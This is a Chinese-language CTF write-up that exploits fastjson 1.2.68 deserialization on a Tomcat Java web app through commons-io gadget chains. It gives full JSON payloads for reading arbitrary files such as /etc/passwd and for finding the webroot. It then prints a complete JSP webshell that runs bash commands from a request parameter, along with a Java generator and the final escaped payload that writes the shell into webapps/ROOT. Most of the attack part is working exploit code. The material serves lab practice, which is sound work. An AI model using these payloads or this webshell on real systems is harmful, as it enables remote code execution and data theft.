FastJsonParty系列进阶篇，写的另一个非SpringBoot的jar包的项目，支持解析jsp，通过写入jsp到getshell，在不出网条件下同样适用。只是这里就偷个懒，并没有做不出网的环境。

环境应该很熟了，直接来：
首先判断fastjson版本，1.2.68![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698204141117-849250b9-0a5b-47ec-8f9c-440a4cd48eda.png#averageHue=%23f6f5f4&clientId=u54d26ebe-4ccd-4&from=paste&height=194&id=ub45e86f6&originHeight=242&originWidth=1346&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65332&status=done&style=none&taskId=u70562f69-0f5b-4962-9663-7d2a1895409&title=&width=1076.8)
到这就应该明白这是tomcat的标准页面，Java web项目。
1.2.68优先考虑文件读写，探测写文件所需要的依赖：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698204533609-12c3f442-cd85-4f65-bae9-f8f8ca6fed6c.png#averageHue=%23f8f7f5&clientId=u54d26ebe-4ccd-4&from=paste&height=246&id=u17b6c54a&originHeight=307&originWidth=1070&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63893&status=done&style=none&taskId=ud9f8eb0e-8e82-417e-86d5-50df0177ff5&title=&width=856)
是存在commons-io依赖的，且版本小于2.7
payload直接打：测试读文件(验证漏洞是否存在)

```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    114
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
```
从报错来看是可以的 ,/etc/passwd文件的开头是`root` ,r对应的ascii码是114
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698204733148-bb40c43b-cbfc-4525-a790-ee899176bf64.png#averageHue=%23fbfaf8&clientId=u54d26ebe-4ccd-4&from=paste&height=276&id=u744531d4&originHeight=345&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74904&status=done&style=none&taskId=u6d207e65-26f1-41af-83dd-f25fb897d32&title=&width=969.6)
ok，下一步文件写，需要文件写那肯定得知道网站在tomcat下的绝对路径。如果跑tomcat的默认安装目录还是有可能成功，但是几率太小了，还是从文件读这里入手。
从上面的payload中可以看到读文件用到的是`file:///etc/passwd`file协议，在Java中file协议不仅能用来读文件，也可以用来列目录，这就为探测tomcat绝对路径提供了很好的条件。
写一个python脚本跑字节就可以了：[writefile.py](readfile.py)

最后就能跑出来绝对路径为`/usr/local/tomcat/apache-tomcat-8.5.95/webapps`  
(tips:虽然可以用file协议直接读取到其中的flag，但是我建议你不要这样做orz  非预期不想修了)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698205195270-347c08bd-ca00-4824-a93c-b5bde2f117d0.png#averageHue=%231a1a19&clientId=u54d26ebe-4ccd-4&from=paste&height=95&id=uab3b94af&originHeight=119&originWidth=1006&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8226&status=done&style=none&taskId=uf0df3d21-4ff7-4de1-a43d-7bb88b93b7e&title=&width=804.8)
现在可以写文件了，先写一个jsp的命令执行回显马：

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Test</title>
</head>
<body>
<%

    java.io.PrintWriter writer = response.getWriter();
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        java.lang.Process exec = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        java.io.InputStream inputStream = exec.getInputStream();
        java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            writer.println(line);
        }
    } else {
        writer.println("connect success");
    }
%>
</body>
</html>
```
使用写文件的payload(所有payload都记录在之前的文章中了)
```java
String code = "<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n" +
                "<html>\n" +
                "<head>\n" +
                "    <title>Test</title>\n" +
                "</head>\n" +
                "<body>\n" +
                "<%\n" +
                "\n" +
                "    java.io.PrintWriter writer = response.getWriter();\n" +
                "    String cmd = request.getParameter(\"cmd\");\n" +
                "    if (cmd != null) {\n" +
                "        java.lang.Process exec = Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", cmd});\n" +
                "        java.io.InputStream inputStream = exec.getInputStream();\n" +
                "        java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));\n" +
                "        String line;\n" +
                "        while ((line = bufferedReader.readLine()) != null) {\n" +
                "            writer.println(line);\n" +
                "        }\n" +
                "    } else {\n" +
                "        writer.println(\"connect success\");\n" +
                "    }\n" +
                "%>\n" +
                "</body>\n" +
                "</html>";
        int length = code.length();
        for (int i = 0; i <= 8192 - length; i++) {
            code += "a";
        }
        String poc4 = "{\n" +
                "  \"x\":{\n" +
                "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "    \"input\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "        \"charSequence\":{\"@type\":\"java.lang.String\"\"" + code + "\"\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\":1024\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "      \"writer\":{\n" +
                "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "        \"file\":\"/root/Desktop/apache-tomcat-8.5.95/webapps/ROOT/shell.jsp\",\n" +
                "        \"encoding\":\"UTF-8\",\n" +
                "        \"append\": false\n" +
                "      },\n" +
//                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"charset\":\"UTF-8\",\n" +
                "      \"bufferSize\": 1024,\n" +
                "      \"writeImmediately\": true\n" +
                "    },\n" +
                "    \"trigger\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "    \"trigger2\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "    \"trigger3\":{\n" +
                "      \"@type\":\"java.lang.AutoCloseable\",\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "          \"$ref\":\"$.input\"\n" +
                "        },\n" +
                "        \"branch\":{\n" +
                "          \"$ref\":\"$.branch\"\n" +
                "        },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    }\n" +
                "  }\n" +
                "}";
System.out.println(poc4);
```
java执行后即可生成一段payload，但是直接用这段payload会报错，
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698205773747-18e19aba-53e3-4348-90e7-9ce4cf2031e3.png#averageHue=%23f7f6f5&clientId=u54d26ebe-4ccd-4&from=paste&height=340&id=uf1fa1385&originHeight=425&originWidth=1216&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108058&status=done&style=none&taskId=u5ebee354-a771-4f70-8364-8c6f1f5c0df&title=&width=972.8)
原因是其中jsp木马中的`""`没有做转义处理，做一些优化处理

```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>
<html>
<head>
    <title>Test</title>
</head>
<body>
<%
    java.io.PrintWriter writer = response.getWriter();
    String cmd = request.getParameter(\"cmd\");
    if (cmd != null) {
        java.lang.Process exec = Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", cmd});
        java.io.InputStream inputStream = exec.getInputStream();
        java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            writer.println(line);
        }
    } else {
        writer.println(\"connect success\");
    }
%>
</body>
</html><!--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   --%>"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/usr/local/tomcat/apache-tomcat-8.5.95/webapps/ROOT/shell.jsp",
        "encoding":"UTF-8",
        "append": false
      },
      "charset":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698205899338-a23efc0c-1764-4fab-bebb-5fcdefeedafa.png#averageHue=%23f8f8f7&clientId=u54d26ebe-4ccd-4&from=paste&height=337&id=u7b82df9f&originHeight=421&originWidth=1216&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81159&status=done&style=none&taskId=u591f91f8-9717-4ead-848b-ece9291e0e2&title=&width=972.8)
这样就代表写入成功了。写入的是webapps/ROOT跟目录下，访问试试：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698205966455-754c631f-fd5a-4968-a4f3-0a8c6974e1dc.png#averageHue=%23dcd5b1&clientId=u54d26ebe-4ccd-4&from=paste&height=122&id=ud4535049&originHeight=153&originWidth=607&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7884&status=done&style=none&taskId=u21fa3666-c33c-4cf5-ad9d-61fd978ab03&title=&width=485.6)
获取flag：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1698206004045-6ce544b1-e8b2-41b5-a4e0-72cd5abd7d59.png#averageHue=%23d8cea6&clientId=u54d26ebe-4ccd-4&from=paste&height=114&id=u12d43f64&originHeight=142&originWidth=745&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10698&status=done&style=none&taskId=uddc229bb-d422-433c-87fe-471367626d2&title=&width=596)

